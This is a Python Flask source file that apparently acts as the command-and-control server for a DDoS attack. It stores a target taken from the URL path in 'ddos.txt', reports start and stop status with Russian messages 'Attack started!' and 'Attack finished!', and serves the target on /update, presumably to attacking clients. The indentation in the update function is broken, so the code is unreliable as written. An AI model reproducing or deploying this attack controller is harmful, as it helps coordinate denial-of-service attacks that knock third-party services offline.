from flask import Flask, request

app = Flask(__name__)

@app.route('/<message>')
def save_text(message):
    file_name = 'ddos.txt'
    with open(file_name, 'w') as file:
        file.write(message)
    with open("status.txt", "w") as file1:
        file1.write("Started!")

    return 'Атака начата!'

@app.route("/status")
def get_status():
    with open("status.txt", "r") as file2:
        stat = str(file2.read())
    return stat

@app.route("/stop")
def stop():
    with open("status.txt", "w") as file3:
        file3.write("Stopped!")
    with open("ddos.txt", "w") as file4:
    	file4.write("")
    return "Атака завершена!"

@app.route("/update")

def update():
	with open("ddos.txt", "r") as file5:
		text = file5.read()
	        return text

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
